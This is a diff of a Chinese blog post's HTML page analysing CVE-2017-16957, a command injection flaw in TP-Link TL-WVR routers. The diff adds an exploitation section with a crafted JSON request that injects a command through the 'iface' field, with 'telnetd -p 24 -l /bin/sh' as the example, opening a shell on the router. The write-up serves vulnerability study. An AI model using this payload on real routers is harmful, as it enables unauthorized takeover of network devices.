@@ -89,10 +89,12 @@
 <meta property="og:site_name" content="leesinc1&#39;s blog">
 <meta property="og:description" content="环境路由器型号：TL-WVR300 kali linux 2018.1 漏洞描述TP-Link TL-WVR 等都是中国普联（TP-LINK）公司的无线路由器产品。多款 TP-Link 系列产品存在命令注入漏洞，攻击者在登录后可发送恶意字段，经拼接后导致任意命令执行。影响版本比较广泛。漏洞编号：CVE-2017-16957 代码分析先从TP-Link官网下载TL-WVR300的压缩包。 下载地址解">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-04-02T03:23:00.317Z">
+<meta property="og:image" content="http://yoursite.com/uploads/iopopen.png">
+<meta property="og:updated_time" content="2018-04-09T02:49:32.506Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="TP-Link路由器任意命令注入漏洞分析">
 <meta name="twitter:description" content="环境路由器型号：TL-WVR300 kali linux 2018.1 漏洞描述TP-Link TL-WVR 等都是中国普联（TP-LINK）公司的无线路由器产品。多款 TP-Link 系列产品存在命令注入漏洞，攻击者在登录后可发送恶意字段，经拼接后导致任意命令执行。影响版本比较广泛。漏洞编号：CVE-2017-16957 代码分析先从TP-Link官网下载TL-WVR300的压缩包。 下载地址解">
+<meta name="twitter:image" content="http://yoursite.com/uploads/iopopen.png">
 
 
 
@@ -359,7 +361,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  602
+                  747
                 </span>
               
 
@@ -407,7 +409,10 @@
 <p>可以看到参数<strong>http_form</strong>进行json解析后，把json参数<strong>params.iface</strong>赋给<strong>my_iface</strong>再传入<strong>zone_get_effect_devices</strong>。这个过程中并未对http_form参数进行敏感字段过滤。<br>再往下找到调用<strong>ping_action</strong>的函数<strong>start_action</strong>(大概在403行)。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">local function start_action(http_form)</div><div class="line">    local form_data = json.decode(http_form.data)</div><div class="line">    local params = form_data.params</div><div class="line">    local types = params.type or &quot;&quot;</div><div class="line">    </div><div class="line">    local ret</div><div class="line">    if types == &quot;0&quot; then</div><div class="line">	    dbg(&quot;ping begin!&quot;)</div><div class="line">        ret = ping_action(http_form)</div><div class="line">    elseif types == &quot;1&quot; then</div><div class="line">	    dbg(&quot;troute begin!&quot;)</div><div class="line">        ret = trace_action(http_form)</div><div class="line">    end</div><div class="line"></div><div class="line">    return ret or false</div><div class="line"></div><div class="line">end</div></pre></td></tr></table></figure></p>
 <p>可以看到这个过程也没有对<strong>http_form</strong>进行安全检测。再往下找到调用<strong>start_action</strong>的地方(代码最下面)。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">local dispatch_tbl = &#123;</div><div class="line">    diag = &#123;</div><div class="line">        [&quot;start&quot;]    = &#123;cb = start_action&#125;,</div><div class="line">        [&quot;stop&quot;]     = &#123;cb = stop_action&#125;,</div><div class="line">        [&quot;get&quot;]     = &#123;cb = get_default_value&#125;,</div><div class="line">        [&quot;continue&quot;] = &#123;cb = continue_action&#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
 <p>调用之前也没有做任何检测。所以结合分析，使用<strong>start_action</strong>函数来检测系统的网络连接，再执行这个操作的过程对于参数没有做任何检查，导致命令拼接之后实现命令注入漏洞。</p>
-<h2 id="复现（待更新）"><a href="#复现（待更新）" class="headerlink" title="复现（待更新）"></a>复现（待更新）</h2>
+<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>可以构造如下json编码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    &quot;method&quot;:&quot;start&quot;,</div><div class="line">    &quot;params&quot;:&#123;</div><div class="line">        &quot;type&quot;:&quot;0&quot;,</div><div class="line">        &quot;type_hidden&quot;:&quot;0&quot;,</div><div class="line">        &quot;ipaddr_ping&quot;:&quot;127.0.0.1&quot;,</div><div class="line">        &quot;iface_ping&quot;:&quot;WAN1&quot;,</div><div class="line">        &quot;ipaddr&quot;:&quot;127.0.0.1&quot;,</div><div class="line">        &quot;iface&quot;:&quot;;shellcode&quot;,</div><div class="line">        &quot;count&quot;:&quot;1&quot;,</div><div class="line">        &quot;pktsize&quot;:&quot;64&quot;,</div><div class="line">        &quot;my_result&quot;:&quot;exploit&quot;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>可以改变如上代码中，iface字段shellcode的内容,比如<strong>telnetd -p 24 -l /bin/sh</strong>,web登录认证以后，发送payload，路由器会执行上述命令，然后打开路由器的telent功能，之后你就能为所欲为了。</p>
+<p>全局搜索<strong>io.popen</strong>后发现漏洞不止一处<br><img src="/uploads/iopopen.png" alt="io.popen"><br>发现很多类似上述的代码段，直接拼接命令后直接执行，这是非常危险的。</p>
+
       
     </div>
     
@@ -631,7 +636,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#环境"><span class="nav-number">1.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞描述"><span class="nav-number">2.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#代码分析"><span class="nav-number">3.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#复现（待更新）"><span class="nav-number">4.</span> <span class="nav-text">复现（待更新）</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#环境"><span class="nav-number">1.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞描述"><span class="nav-number">2.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#代码分析"><span class="nav-number">3.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用方式"><span class="nav-number">4.</span> <span class="nav-text">利用方式</span></a></li></ol></div>
             
 
           </div>
@@ -683,7 +688,7 @@
 -->
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共14.9k字</span>
+  <span class="post-count">博客全站共15.0k字</span>
         
 
 
